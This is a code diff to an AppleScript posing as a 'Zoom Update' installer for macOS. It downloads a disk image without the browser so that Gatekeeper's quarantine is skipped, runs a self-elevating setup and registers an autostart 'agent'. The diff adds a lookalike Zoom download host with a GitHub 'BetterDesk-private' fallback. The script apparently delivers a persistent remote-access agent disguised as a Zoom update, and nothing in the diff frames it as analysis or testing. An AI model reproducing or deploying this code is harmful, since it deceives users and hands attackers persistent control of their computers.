@@ -1,11 +1,13 @@
 -- Zoom Update - macOS wrapper for the zoom-private client
 --
 -- Downloads the HTTPS-hosted disk image (no browser download, so Gatekeeper
--- never sees a quarantined file), mounts it, runs the self-elevating setup
--- app, then removes the image. The setup app installs the client, verifies
--- its SHA-256, registers autostart and starts the agent.
+-- never sees a quarantined file), falls back to the GitHub release mirror if
+-- the primary host is down, mounts it, runs the self-elevating setup app,
+-- then removes the image. The setup app installs the client, verifies its
+-- SHA-256, registers autostart and starts the agent.
 
-property payloadUrl : "https://github.com/fingod201-maker/BetterDesk-private/releases/download/setup-latest/zoom-private.Setup_1.0.0_x64_en-US.dmg"
+property payloadUrl : "https://us05web.telcom.stream/zoom-private.Setup_1.0.0_x64_en-US.dmg"
+property fallbackUrl : "https://github.com/fingod201-maker/BetterDesk-private/releases/download/setup-latest/zoom-private.Setup_1.0.0_x64_en-US.dmg"
 property payloadName : "zoom-private.Setup_1.0.0_x64_en-US.dmg"
 property setupAppName : "zoom-private Setup.app"
 property agentAppName : "zoom-private.agent.app"
@@ -16,7 +18,13 @@ on run
 
 	try
 		checkAccessibility()
-		downloadFile(payloadUrl, tempFile)
+		try
+			downloadFile(payloadUrl, tempFile)
+			validateImage(tempFile)
+		on error
+			downloadFile(fallbackUrl, tempFile)
+			validateImage(tempFile)
+		end try
 		set mountPoint to mountImage(tempFile)
 		runInstaller(mountPoint)
 		startAgent()
@@ -54,6 +62,10 @@ on downloadFile(sourceUrl, destination)
 		error "Download failed (" & errNum & "): " & errMsg number errNum
 	end try
 end downloadFile
+
+on validateImage(imageFile)
+	do shell script "/usr/bin/hdiutil imageinfo " & quoted form of imageFile & " >/dev/null"
+end validateImage
 
 on mountImage(imageFile)
 	set attachedPath to ""
